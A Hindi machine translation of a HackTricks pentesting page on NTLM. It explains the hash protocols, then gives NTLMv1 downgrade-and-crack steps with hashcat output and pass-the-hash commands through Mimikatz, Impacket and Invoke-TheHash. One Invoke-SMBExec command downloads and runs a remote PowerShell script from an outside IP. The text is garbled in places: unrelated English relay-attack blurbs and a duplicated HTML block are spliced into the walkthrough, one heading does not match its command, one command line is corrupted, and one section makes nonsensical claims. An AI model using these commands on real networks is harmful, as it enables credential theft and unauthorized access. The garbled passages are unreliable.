# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी को हैकट्रिक्स में विज्ञापित किया जाए**? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक पीएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर **फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो** (https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके**.

</details>

## मूल जानकारी

जहां **Windows XP और सर्वर 2003** का उपयोग होता है, वहां LM (Lan Manager) हैश का उपयोग किया जाता है, हालांकि यह मान्य है कि इन्हें आसानी से ध्वस्त किया जा सकता है। विशेष एलएम हैश, `AAD3B435B51404EEAAD3B435B51404EE`, एक स्थिति को दर्शाता है जहां एलएम का उपयोग नहीं होता है, जो खाली स्ट्रिंग के लिए हैश को प्रतिनिधित्व करता है।

डिफ़ॉल्ट रूप से, **कर्बेरोस** प्रमाणीकरण प्रोटोकॉल प्रमुख रूप से उपयोग किया जाता है। NTLM (NT LAN Manager) विशेष परिस्थितियों में उपयोग में आता है: एक्टिव डायरेक्टरी की अनुपस्थिति, डोमेन की अस्तित्व की अनुपस्थिति, कर्बेरोस की गलत विन्यास के कारण असफलता, या जब कनेक्शन IP पते का उपयोग करके मान्य होस्टनाम की बजाय की कोशिश की जाती है।

नेटवर्क पैकेट में **"NTLMSSP"** हेडर की उपस्थिति NTLM प्रमाणीकरण प्रक्रिया की संकेत देती है।

प्रमाणीकरण प्रोटोकॉल - LM, NTLMv1, और NTLMv2 - का समर्थन एक विशिष्ट DLL द्वारा सुविधित किया जाता है जो `%windir%\Windows\System32\msv1\_0.dll` पर स्थित है।

**मुख्य बिंदु**:
- LM हैश विकल्पशील हैं और एक खाली LM हैश (`AAD3B435B51404EEAAD3B435B51404EE`) इसके अपयोग की अभावना को दर्शाता है।
- कर्बेरोस डिफ़ॉल्ट प्रमाणीकरण विधि है, NTLM केवल विशेष परिस्थितियों में उपयोग किया जाता है।
- NTLM प्रमाणीकरण पैकेटों को "NTLMSSP" हेडर द्वारा पहचाना जा सकता है।
- LM, NTLMv1, और NTLMv2 प्रोटोकॉल सिस्टम फ़ाइल `msv1\_0.dll` द्वारा समर्थित किए जाते हैं।

## LM, NTLMv1 और NTLMv2

आप जांच कर सकते हैं और कॉन्फ़िगर कर सकते हैं कि कौन सा प्रोटोकॉल उपयोग किया जाएगा:

### GUI

_secpol.msc_ चलाएं -> स्थानीय नीतियाँ -> सुरक्षा विकल्प -> नेटवर्क सुरक्षा: LAN Manager प्रमाणीकरण स्तर। 6 स्तर हैं (0 से 5 तक)।

![](<../../.gitbook/assets/image (92).png>)

### रजिस्ट्री

यह स्तर 5 सेट करेगा:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## बेसिक NTLM डोमेन प्रमाणीकरण योजना

1. **उपयोगकर्ता** अपने **प्रमाणपत्र** प्रस्तुत करता है
2. क्लाइंट मशीन **प्रमाणीकरण अनुरोध भेजती है** जिसमें **डोमेन नाम** और **उपयोगकर्ता नाम** भेजती है
3. **सर्वर** **चुनौती** भेजता है
4. **क्लाइंट** चुनौती को **पासवर्ड के हैश का उपयोग करके एन्क्रिप्ट** करता है और इसे प्रतिक्रिया के रूप में भेजता है
5. **सर्वर** **डोमेन कंट्रोलर** को **डोमेन नाम, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया** भेजता है। यदि **सक्रिय निर्देशिका** कॉन्फ़िगर नहीं है या डोमेन नाम सर्वर का नाम है, तो प्रमाणपत्र **स्थानीय रूप से जांची जाती है**।
6. **डोमेन कंट्रोलर** जांचता है कि सब कुछ सही है और सर्वर को जानकारी भेजता है

**सर्वर** और **डोमेन कंट्रोलर** को **नेटलॉगन** सर्वर के माध्यम से **सुरक्षित चैनल** बनाने में सक्षम होते हैं क्योंकि डोमेन कंट्रोलर सर्वर के पासवर्ड को जानता है (यह **NTDS.DIT** डेटाबेस में है)।

### स्थानीय NTLM प्रमाणीकरण योजना

प्रमाणीकरण उसी तरह है जैसा **पहले उल्लिखित** है, लेकिन **सर्वर** उस **उपयोगकर्ता के हैश को जानता है** जो प्रमाणीकरण करने की कोशिश कर रहा है सामग्री में। इसलिए, डोमेन कंट्रोलर से पूछने की बजाय, **सर्वर खुद की जांच करेगा** कि क्या उपयोगकर्ता प्रमाणीकृत हो सकता है।

### NTLMv1 चुनौती

**चुनौती लंबाई 8 बाइट** है और **प्रतिक्रिया 24 बाइट** लंबी है।

**हैश NT (16 बाइट)** को **3 हिस्सों में विभाजित किया जाता है (प्रत्येक 7 बाइट)**: **आखिरी हिस्सा शून्यों से भरा होता है**। फिर, **चुनौती** को प्रत्येक हिस्से के साथ **अलग-अलग एन्क्रिप्ट** किया जाता है और परिणामी एन्क्रिप्ट बाइट्स **जोड़ी जाती हैं**। कुल: 8 बी + 8 बी + 8 बी = 24 बाइट।

**समस्याएं**:

* **अनियमितता की कमी**
* 3 हिस्से अलग-अलग **हमले किए जा सकते हैं** ताकि NT हैश पता लगाया जा सके
* **DES को तोड़ा जा सकता है**
* 3 वां कुंजी हमेशा **5 शून्यों** से मिलकर बनाई जाती है।
* **एक ही चुनौती** दिया जाएगा तो **प्रतिक्रिया** **समान** होगी। इसलिए, आप पीड़ित को **पूर्व-गणना रेनबो तालिकाओं** का उपयोग करके प्रतिक्रिया के लिए "**1122334455667788**" स्ट्रिंग दे सकते हैं और प्रतिक्रिया पर हमला कर सकते हैं।

### NTLMv1 हमला

आजकल अनकंशित डेलीगेशन कॉन्फ़िगर किए गए वातावरण पाना कम हो रहा है, लेकिन यह यह नहीं मतलब है कि आप **प्रिंट स्पूलर सेवा** का दुरुपयोग नहीं कर सकते।

आप AD पर पहले से कुछ प्रमाणपत्र/सत्र हैं जिन्हें आप **किसी अपने नियंत्रण के तहत होस्ट** के खिलाफ प्रमाणीकरण के लिए प्रिंटर से पूछ सकते हैं। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **प्रमाणीकरण चुनौती को 1122334455667788** सेट कर सकते हैं, प्रमाणीकरण प्रयास को कैप्चर कर सकते हैं, और यदि यह **NTLMv1** के साथ किया गया था तो आप इसे **तोड़ सकेंगे**।\
यदि आप `responder` का उपयोग कर रहे हैं तो आप \*\*ध्यान दें कि इस तकनीक के लिए प्रमाणीकरण को NTLMv1 का उपयोग करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

ध्यान रखें कि प्रिंटर प्रमाणीकरण के दौरान कंप्यूटर खाता का उपयोग करेगा, और कंप्यूटर खाते का उपयोग **लंबे और यादृच्छिक पासवर्ड** करते हैं जिन्हें आप **सामान्य शब्दकोश** का उपयोग करके **तोड़ने** के लिए **संभावना नहीं** होगी। लेकिन **NTLMv1** प्रमाणीकरण **DES का उपयोग करता है** ([अधिक जानकारी यहाँ](./#ntlmv1-challenge)), इसलिए कुछ विशेष रूप से DES को तोड़ने के लिए सेवाओं का उपयोग करके आप इसे तोड़ सकेंगे (आप [https://crack.sh/](https://crack.sh) का उपयोग कर सकते हैं)।

### hashcat के साथ NTLMv1 हमला

NTLMv1 को NTLMv1 मल्टी टूल [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) के साथ तोड़ा जा सकता है जो NTLMv1 संदेशों को एक ऐसी विधि में स्वरूपित करता है जिसे hashcat के साथ तोड़ा जा सकता है।

आदेश
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

NTLM Relay Attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to authenticate as the victim. This attack can be used to gain unauthorized access to systems and resources.

### How it works

1. Attacker captures the NTLM authentication request sent by the victim.
2. Attacker relays the captured request to a target server.
3. Target server authenticates the attacker as the victim.
4. Attacker gains unauthorized access to the target server.

### Mitigation

To mitigate NTLM Relay Attacks, it is recommended to:
- Use SMB Signing to prevent relay attacks.
- Implement Extended Protection for Authentication.
- Disable NTLM authentication where possible.
- Use strong, unique passwords to make relay attacks more difficult.

By following these mitigation techniques, organizations can reduce the risk of falling victim to NTLM Relay Attacks.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
```markdown
## NTLM Relay Attack

### Introduction

NTLM relay attacks are a common technique used by hackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic and relaying it to a target server to gain unauthorized access.

### How it works

1. The attacker intercepts NTLM authentication traffic between a client and a server.
2. The attacker relays this traffic to another server, tricking it into thinking the attacker is the legitimate client.
3. The attacker gains unauthorized access to the target server using the intercepted credentials.

### Mitigation

To prevent NTLM relay attacks, consider implementing the following measures:

- Disable NTLM authentication where possible and use more secure protocols like Kerberos.
- Enable SMB signing to protect against tampering with authentication traffic.
- Implement network segmentation to limit the scope of potential attacks.
```

```html
<h2>NTLM रिले अटैक</h2>

<h3>परिचय</h3>

<p>NTLM रिले हमले हैकर्स द्वारा विशेषाधिकारों को बढ़ाने के लिए एक सामान्य तकनीक है जो एक Windows वातावरण में प्रयोग की जाती है। यह हमला NTLM प्रमाणीकरण ट्रैफिक को आत्मस्वीकृत उपयोग के लिए एक लक्ष्य सर्वर को रिले करने में शामिल है।</p>

<h3>यह कैसे काम करता है</h3>

<ol>
<li>हमलावर एक क्लाइंट और एक सर्वर के बीच NTLM प्रमाणीकरण ट्रैफिक को अंतर्दृष्टि करता है।</li>
<li>हमलावर इस ट्रैफिक को एक और सर्वर को रिले करता है, जिससे यह धोखाधड़ी करता है कि हमलावर वास्तविक क्लाइंट है।</li>
<li>हमलावर अंतर्दृष्टि किए गए क्रेडेंशियल का उपयोग करके लक्ष्य सर्वर तक अनधिकृत पहुंच प्राप्त करता है।</li>
</ol>

<h3>संरोधन</h3>

<p>NTLM रिले हमलों को रोकने के लिए निम्नलिखित उपायों को लागू करने का विचार करें:</p>

<ul>
<li>संभावना होने पर NTLM प्रमाणीकरण को अक्षम करें और Kerberos जैसे अधिक सुरक्षित प्रोटोकॉल का उपयोग करें।</li>
<li>ऑथेंटिकेशन ट्रैफिक के साथ खिलवाड़ करने से बचने के लिए SMB साइनिंग सक्षम करें।</li>
<li>संभावित हमलों के दायरे को सीमित करने के लिए नेटवर्क सेगमेंटेशन का अमल करें।</li>
</ul>
```
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
वितरित हैशकैट (hashtopolis जैसे एक उपकरण के माध्यम से सर्वोत्तम) के रूप में चलाएं क्योंकि अन्यथा यह कई दिनों तक लग सकता है।
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
इस मामले में हमें इसका पासवर्ड पता है कि 'पासवर्ड' है, इसलिए हम डेमो के उद्देश्यों के लिए धोखा देने जा रहे हैं:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
हमें अब hashcat-utilities का उपयोग करना होगा ताकि क्रैक किए गए des कुंजी को NTLM हैश के हिस्सों में बदला जा सके:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
अंत में आखिरकार आखिरकार आखिरकार:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM

## NTLM विस्तार

NTLM एक पुराना प्रमाणीकरण प्रोटोकॉल है जिसे Windows ऑपरेटिंग सिस्टम्स में प्रयोग किया जाता है। यह एक पासवर्ड-मैन-दी-मिडिलमैन (पीएसएम) प्रोटोकॉल है जिसका उपयोग विभिन्न सेवाओं और संसाधनों की पहचान के लिए किया जाता है।

## NTLM की समस्याएं

NTLM कई सुरक्षा समस्याओं का कारण बन सकता है, जैसे कि पासवर्ड की चुनौती, रिप्ले अटैक्स, और मिडिलमैन अटैक्स। इन समस्याओं का सामना करने के लिए, NTLM को सक्षम करने के लिए कई हार्डनिंग उपाय हैं।

## NTLM हार्डनिंग

NTLM हार्डनिंग के लिए कुछ सुरक्षा सुझाव शामिल हैं:

- NTLM का प्रयोग कम से कम करें और उसे केवल जरूरत के अनुसार ही सक्षम करें।
- NTLM अनुमतियों को सीमित करें और उन्हें सक्षम करने से पहले सुनिश्चित करें कि वे सुरक्षित हैं।
- NTLM हैश की वैधता की जांच करने के लिए एक वैधता जांच सेवा का उपयोग करें।

इन सुरक्षा सुझावों का पालन करके, NTLM को हार्डन करने में मदद मिल सकती है और संगठन की सुरक्षा को मजबूत कर सकती है।
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**चुनौती की लंबाई 8 बाइट है** और **2 प्रतिक्रियाएँ भेजी जाती हैं**: एक **24 बाइट** लंबी है और **दूसरी** की लंबाई **विविध** है।

**पहली प्रतिक्रिया** को **HMAC\_MD5** का उपयोग करके बनाया जाता है, **client और domain** द्वारा गठित **स्ट्रिंग** को और **कुंजी** के रूप में **NT hash** के **हैश MD4** का उपयोग करके। फिर, **परिणाम** को **कुंजी** के रूप में उपयोग करके **HMAC\_MD5** का उपयोग करके **चुनौती** को बनाया जाएगा। इसके लिए, **8 बाइट का एक client challenge जोड़ा जाएगा**। कुल: 24 B।

**दूसरी प्रतिक्रिया** को बनाने के लिए **कई मान** का उपयोग किया जाता है (एक नया client challenge, **replay attacks** से बचने के लिए एक **timestamp**...)

यदि आपके पास एक **pcap है जिसने एक सफल प्रमाणीकरण प्रक्रिया को कैप्चर किया है**, तो आप इस गाइड का पालन करके डोमेन, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया प्राप्त कर सकते हैं और पासवर्ड को तोड़ने का प्रयास कर सकते हैं: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**जब आपके पास पीड़ित का हैश होता है**, तो आप इसका उपयोग **अनुकरण** करने के लिए कर सकते हैं।\
आपको एक **उपकरण** का उपयोग करना होगा जो **उस हैश का उपयोग करके NTLM प्रमाणीकरण करेगा**, **या** आप एक नई **sessionlogon** बना सकते हैं और **LSASS** में उस **हैश** को **इंजेक्ट** कर सकते हैं, ताकि जब भी कोई **NTLM प्रमाणीकरण किया जाता है**, तो उस **हैश का उपयोग होगा।** आखिरी विकल्प है जिसे mimikatz करता है।

**कृपया ध्यान दें कि आप कंप्यूटर खातों का उपयोग करके भी Pass-the-Hash हमले कर सकते हैं।**

### **Mimikatz**

**व्यवस्थापक के रूप में चलाने की आवश्यकता है**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
यह एक प्रक्रिया को शुरू करेगा जो उन उपयोगकर्ताओं के नाम पर होगी जिन्होंने मिमीकैट्ज लॉन्च किया है, लेकिन LSASS में सहेजे गए क्रेडेंशियल्स मिमीकैट्ज पैरामीटर्स के अंदर होंगे। फिर, आप नेटवर्क संसाधनों तक पहुंच सकते हैं जैसे कि आप उस उपयोगकर्ता हो (‘runas /netonly’ ट्रिक के समान लेकिन आपको plain-text पासवर्ड पता नहीं होना चाहिए)।

### लिनक्स से पास-द-हैश

आप लिनक्स से पास-द-हैश का उपयोग करके विंडोज मशीनों में कोड निष्पादन प्राप्त कर सकते हैं।\
[**यहाँ क्लिक करें जानने के लिए कैसे करें।**](../../windows/ntlm/broken-reference/)

### Impacket विंडोज कंपाइल्ड उपकरण

आप यहाँ से [विंडोज के लिए impacket बाइनरी डाउनलोड कर सकते हैं](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)।

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (इस मामले में आपको एक कमांड निर्दिष्ट करने की आवश्यकता है, cmd.exe और powershell.exe एक इंटरैक्टिव शैली प्राप्त करने के लिए मान्य नहीं हैं) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* और कई और Impacket बाइनरी हैं...

### Invoke-TheHash

आप यहाँ से पावरशेल स्क्रिप्ट प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### इन्वोक-डब्ल्यूएमआईइक्जेक्यूट
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### इन्वोक-एसएमबीईनुम
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह फ़ंक्शन **सभी अन्य** का **मिश्रण** है। आप **कई होस्ट** को पास कर सकते हैं, **किसी को छोड़ सकते** हैं और जिस **विकल्प** का उपयोग करना चाहते हैं उसे **चुन सकते** हैं (_SMBExec, WMIExec, SMBClient, SMBEnum_). अगर आप **SMBExec** और **WMIExec** में से **किसी भी** को चुनते हैं लेकिन आप कोई _**कमांड**_ पैरामीटर नहीं देते हैं तो यह **बस जांचेगा** कि क्या आपके पास **पर्याप्त अनुमतियाँ** हैं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM पास द हैश](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे व्यवस्थापक के रूप में चलाया जाना चाहिए**

यह उपकरण mimikatz की तरही काम करेगा (LSASS मेमोरी को संशोधित करेगा)।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### मैनुअल Windows रिमोट एक्जीक्यूशन उपयोगकर्ता नाम और पासवर्ड के साथ

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## एक Windows होस्ट से क्रेडेंशियल्स निकालना

**अधिक जानकारी के लिए** [**एक Windows होस्ट से क्रेडेंशियल्स प्राप्त करने के बारे में आपको इस पृष्ठ को पढ़ना चाहिए**](broken-reference)**.**

## NTLM रिले और रिस्पॉन्डर

**इन हमलों को कैसे करने के लिए एक विस्तृत गाइड पढ़ें:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## नेटवर्क कैप्चर से NTLM चैलेंज पार्स करें

**आप** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **का उपयोग कर सकते हैं**
